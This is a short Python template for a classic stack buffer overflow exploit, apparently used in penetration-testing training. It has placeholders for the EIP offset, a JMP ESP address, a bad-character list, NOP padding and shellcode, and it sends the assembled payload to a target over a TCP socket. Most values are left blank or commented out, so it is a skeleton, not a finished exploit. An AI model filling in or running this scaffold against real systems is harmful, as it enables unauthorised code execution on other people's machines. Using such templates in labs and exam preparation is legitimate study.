# ip        --> IP ADDRESS
# port      --> PORT NUMBER
# prefix    --> CHANGE <PREFIX> | DON'T FORGET THE WHITESPACE
# eip       --> REPLACE <EIP_VALUE> WITH msf-pattern_create & msf-pattern_offset FINDINGS
# jmpesp    --> REPLACE <ESP_VALUE> WITH JMP ESP ADDRESS
# badchars  --> BAD CHARACTERS
# padding   --> NOP PADDING
# payload   --> ADJUST VARIABLES ACCORDINGLY
#
import socket, struct

ip = "10.10.10.10"
port = 4444

prefix = b'<PREFIX>'
#eip = b'A' * <EIP_VALUE>
#jmpesp = struct.pack('<L', <ESP_VALUE>)
#badchars = b''.join([struct.pack('<B', x) for x in range(1, 256)])
#padding = b'\x90' * 16

payload = [
        prefix
        #,eip
        #,jmpesp 
        #,badchars
        #,padding
        #,exploit
]
payload = b''.join(payload)                                             

print("---- PAYLOAD ----")
print(payload)

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    s.send(payload)
    print("\nDone!")
except:
    print("\nSomething went wrong!")
